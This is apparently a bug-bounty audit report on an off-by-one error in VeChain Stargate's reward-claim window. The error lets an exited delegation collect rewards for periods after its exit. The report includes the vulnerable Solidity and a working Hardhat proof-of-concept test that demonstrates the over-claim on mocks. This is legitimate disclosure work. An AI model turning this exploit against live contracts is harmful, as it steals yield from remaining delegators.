# 60150 sc high off by one in claim window lets exited delegations harvest post exit rewards

**Submitted on Nov 19th 2025 at 09:23:14 UTC by @yesofcourse for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60150
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Brief/Intro

A logic error in `Stargate._claimableDelegationPeriods` selects a rewards window that can extend **past the delegation’s end** when `nextClaimablePeriod == endPeriod`.

The function falls through to an “active” branch and sets the last claimable period to the validator’s `completedPeriods`, enabling an exited position to claim rewards for post-exit periods.

Because `_claimableRewardsForPeriod` uses the token’s **current** effective stake (numerator) but the per-period validator total (denominator) already **excludes** the exited token, the caller siphons yield that belongs to remaining delegators.

This is a High impact theft of unclaimed yield issue.

## Vulnerability Details

The claim window is derived in `_claimableDelegationPeriods`:

```solidity
// currentValidatorPeriod = completedPeriods + 1
uint32 nextClaimablePeriod = $.lastClaimedPeriod[_tokenId] + 1;
if (nextClaimablePeriod < startPeriod) nextClaimablePeriod = startPeriod;

// Intended “ended” path, but notice the strict '>'
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod            // <-- off-by-one
) {
    return (nextClaimablePeriod, endPeriod);
}

// Fallback “active” path (overshoots past endPeriod)
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}
```

If a user has already claimed up to `endPeriod - 1`, then `nextClaimablePeriod == endPeriod`. Even though the delegation **ended** (`endPeriod < currentValidatorPeriod`), the strict comparison `endPeriod > nextClaimablePeriod` is **false** at equality, so the function returns `(endPeriod, completedPeriods)` instead of clamping to `endPeriod`.

Downstream, `_claimableRewardsForPeriod` pays per period without validating membership for that period:

```solidity
uint256 delegationPeriodRewards = $.protocolStakerContract.getDelegatorsRewards(validator, _period);
uint256 effectiveStake          = _calculateEffectiveStake($, _tokenId); // "now", not per-period
uint256 delegatorsEffectiveStake= $.delegatorsEffectiveStake[validator].upperLookup(_period);
if (delegatorsEffectiveStake == 0) return 0;
return (effectiveStake * delegationPeriodRewards) / delegatorsEffectiveStake;
```

* The numerator uses the token’s current effective stake (level factor × VET) regardless of whether the token was delegated in `_period`.
* The denominator is the validator’s snapshotted total for `_period`, which, after exit, **excludes** this token due to the scheduled decrease.

Result: if the window wrongfully includes `period > endPeriod`, the exited token obtains a share of `delegationPeriodRewards` for periods it did not participate in.

### Minimal, reproducible scenario

{% stepper %}
{% step %}
Alice delegates; later requests exit, yielding `endPeriod = E`.
{% endstep %}

{% step %}
Before exit finalizes, she has claimed up to `E−1` → `nextClaimable = E`.
{% endstep %}

{% step %}
Validator advances to `completedPeriods = C > E`.
{% endstep %}

{% step %}
Alice calls `claimRewards(tokenId)`.

* `_claimableDelegationPeriods` returns `(E, C)` (off-by-one).

* Loop pays for all `period ∈ [E, C]`, including `E+1…C`, where Alice was no longer delegated.

* `_lastClaimedPeriod[tokenId] = C` finalizes the over-claim.
  {% endstep %}
  {% endstepper %}

* The off-by-one is explicit (`>` instead of `>=`).

* The fallback returns `completedPeriods`, which grows with time, increasing the illegitimate range.

* No per-period membership check exists to zero out post-exit periods for the token.

## Impact Details

* Per-period theft: For each post-exit period `p`, payout ≈ `delegationRewards[p] * effectiveStake(token) / delegatorsEffectiveStake[p]`, where the denominator excludes the token. Example: prior to exit, the token was 10 of a 100 total (10%). After exit, pool is 90. The bug lets the token claim \~11.11% (`10/90`) of each later period.
* Cumulative loss: By delaying the claim, an attacker can harvest multiple post-exit periods in one call (`[endPeriod, completedPeriods]`).
* Systemic risk: Broad exploitation by high-stake NFTs can materially drain rewards from honest delegators. Depending on treasury/refill mechanics, this can cascade into underpayments for later claimants and accounting drift.

## References

* `Stargate.sol::_claimableDelegationPeriods` — end-window selection with strict `>` on `endPeriod > nextClaimablePeriod`.\
  <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/main/packages/contracts/contracts/Stargate.sol#L919>
* `Stargate.sol::_claimableRewards` / `_claimRewards` — iterate and pay over returned window; set `lastClaimedPeriod` to returned `last`.\
  <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/main/packages/contracts/contracts/Stargate.sol#L792-L823>
* `Stargate.sol::_claimableRewardsForPeriod` — numerator uses current effective stake; denominator is per-period snapshot; no membership guard.\
  <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/main/packages/contracts/contracts/Stargate.sol#L829-L855>
* `Stargate.sol::_updatePeriodEffectiveStake` — explains why post-exit denominators exclude the token (scheduled future decrease).\
  <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/main/packages/contracts/contracts/Stargate.sol#L993>

## Proof of Concept

Save the following file as `test/unit/Stargate/OffByOnePostExitOverclaim.test.ts` and run with `npx hardhat test test/unit/Stargate/OffByOnePostExitOverclaim.test.ts`:

```javascript
// Ensure config library has an environment to work with during unit tests
if (!process.env.VITE_APP_ENV) {
  process.env.VITE_APP_ENV = "local";
}

import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { getOrDeployContracts } from "../../helpers/deploy";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import {
  ProtocolStakerMock__factory,
  ProtocolStakerMock,
  Stargate,
  StargateNFTMock,
  StargateNFTMock__factory,
  MyERC20,
  MyERC20__factory,
} from "../../../typechain-types";
import { expect } from "chai";

describe("shard-u4: Stargate: Off-by-one post-exit overclaim", () => {
  const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";

  const LEVEL_ID = 1;
  const PERIOD_SIZE = 120;

  const VALIDATOR_STATUS_ACTIVE = 2;

  let stargate: Stargate;
  let nft: StargateNFTMock;
  let staker: ProtocolStakerMock;
  let vtho: MyERC20;
  let deployer: HardhatEthersSigner;
  let user: HardhatEthersSigner;
  let validator: HardhatEthersSigner;

  beforeEach(async () => {
    const config = createLocalConfig();
    [deployer, user, validator] = await ethers.getSigners();

    // Deploy mocks
    nft = await new StargateNFTMock__factory(deployer).deploy();
    await nft.waitForDeployment();

    staker = await new ProtocolStakerMock__factory(deployer).deploy();
    await staker.waitForDeployment();

    // Map VTHO to special energy addr
    const vthoImpl = await new MyERC20__factory(deployer).deploy(deployer.address, deployer.address);
    await vthoImpl.waitForDeployment();
    const code = await ethers.provider.getCode(vthoImpl);
    await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, code]);

    // Wire mocks
    config.STARGATE_NFT_CONTRACT_ADDRESS = await nft.getAddress();
    config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await staker.getAddress();

    // Deploy Stargate stack
    const contracts = await getOrDeployContracts({ forceDeploy: true, config });
    stargate = contracts.stargateContract;
    vtho = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);

    // Fund rewards pot
    await (await vtho.mint(stargate, ethers.parseEther("50000000"))).wait();

    // Add ACTIVE validator
    await (await staker.addValidation(validator.address, PERIOD_SIZE)).wait();
    await (await staker.helper__setValidatorStatus(validator.address, VALIDATOR_STATUS_ACTIVE)).wait();
    await (await staker.helper__setStargate(stargate.target)).wait();

    // Level with no maturity, factor=100, stake = 1 VET
    await (
      await nft.helper__setLevel({
        id: LEVEL_ID,
        name: "L1",
        isX: false,
        maturityBlocks: 0,
        scaledRewardFactor: 100,
        vetAmountRequiredToStake: ethers.parseEther("1"),
      })
    ).wait();
  });

  // Stake two NFTs, seed metadata for each minted id, and delegate both to the same validator.
  // Returns [tokenA (attacker/exited), tokenB (remaining)] in mint order.
  async function stakeTwoAndDelegateBoth(): Promise<[bigint, bigint]> {
    const level = await nft.getLevel(LEVEL_ID);

    // stake #1
    await (await stargate.connect(user).stake(LEVEL_ID, { value: level.vetAmountRequiredToStake })).wait();
    const tokenA = await nft.getCurrentTokenId();
    await (
      await nft.helper__setToken({
        tokenId: tokenA,
        levelId: LEVEL_ID,
        mintedAtBlock: 0,
        vetAmountStaked: level.vetAmountRequiredToStake,
        lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
      })
    ).wait();

    // stake #2
    await (await stargate.connect(user).stake(LEVEL_ID, { value: level.vetAmountRequiredToStake })).wait();
    const tokenB = await nft.getCurrentTokenId();
    await (
      await nft.helper__setToken({
        tokenId: tokenB,
        levelId: LEVEL_ID,
        mintedAtBlock: 0,
        vetAmountStaked: level.vetAmountRequiredToStake,
        lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
      })
    ).wait();

    // Delegate both
    await (await stargate.connect(user).delegate(tokenA, validator.address)).wait();
    await (await stargate.connect(user).delegate(tokenB, validator.address)).wait();

    return [tokenA, tokenB];
  }

  it("Bug: nextClaimable == endPeriod → window expands to completedPeriods → post-exit overclaim", async () => {
    const [tokenA, tokenB] = await stakeTwoAndDelegateBoth();

    // Make period 2 the last legitimate period for A:
    // 1) completedPeriods = 1 → request exit (ACTIVE) → endPeriod = 2
    await (await staker.helper__setValidationCompletedPeriods(validator.address, 1)).wait();
    await (await stargate.connect(user).requestDelegationExit(tokenA)).wait();

    // Sanity: period pool is known
    const poolP2 = await staker.getDelegatorsRewards(validator.address, 2);
    expect(poolP2).to.equal(ethers.parseEther("0.1"));

    // 2) Advance beyond end (to amplify the bug range)
    await (await staker.helper__setValidationCompletedPeriods(validator.address, 4)).wait();
    // currentValidatorPeriod = 5; endPeriod(A)=2; lastClaimed(A)=1 → nextClaimable(A)=2==end

    // Optional: demonstrate the bad window (2..4) before claiming
    const claimableBefore = await stargate.claimableDelegationPeriods(tokenA);
    // Expect the buggy fallthrough to completedPeriods=4 (instead of clamp to end=2)
    expect(claimableBefore[0]).to.equal(2n);
    expect(claimableBefore[1]).to.equal(4n);

    const before = await vtho.balanceOf(user.address);

    // Claim for A only (B stays delegated to keep denominators > 0 post-exit)
    await (await stargate.connect(user).claimRewards(tokenA)).wait();

    const after = await vtho.balanceOf(user.address);
    const delta = after - before;

    // Period 2: A gets half of 0.1 → 0.05
    // Periods 3 & 4: denominator no longer includes A → A gets full 0.1 + 0.1
    // Total expected payout = 0.25 ether
    expect(delta).to.equal(ethers.parseEther("0.25"));
  });

  it("Control: claim at end (no overshoot) → total equals 0.05 for A", async () => {
    const [tokenA, _tokenB] = await stakeTwoAndDelegateBoth();

    // Exit sets endPeriod = 2
    await (await staker.helper__setValidationCompletedPeriods(validator.address, 1)).wait();
    await (await stargate.connect(user).requestDelegationExit(tokenA)).wait();

    // Do NOT advance beyond end; set completedPeriods = 2 so window is [2..2]
    await (await staker.helper__setValidationCompletedPeriods(validator.address, 2)).wait();

    // Sanity
    const poolP2 = await staker.getDelegatorsRewards(validator.address, 2);
    expect(poolP2).to.equal(ethers.parseEther("0.1"));

    const before = await vtho.balanceOf(user.address);
    await (await stargate.connect(user).claimRewards(tokenA)).wait();
    const after = await vtho.balanceOf(user.address);

    // Only period 2, split 50/50 → 0.05
    expect(after - before).to.equal(ethers.parseEther("0.05"));
  });
});
```

The PoC demonstrates that:

* The off-by-one in `_claimableDelegationPeriods` (when `nextClaimablePeriod == endPeriod`) expands the window to `completedPeriods` instead of clamping to `endPeriod`.
* `claimableDelegationPeriods(tokenA)` returns `(2, 4)` in the setup, confirming the faulty window.
* `_claimableRewardsForPeriod` pays post-exit periods because the numerator uses the token’s current effective stake while the denominator excludes it.
* The attacker NFT (A) receives `0.25` VTHO (0.05 for period 2 + 0.1 + 0.1 for periods 3–4), i.e., rewards for periods after exit.
* The control test (window `[2..2]`) pays exactly `0.05`, proving the over-claim only occurs due to the off-by-one.
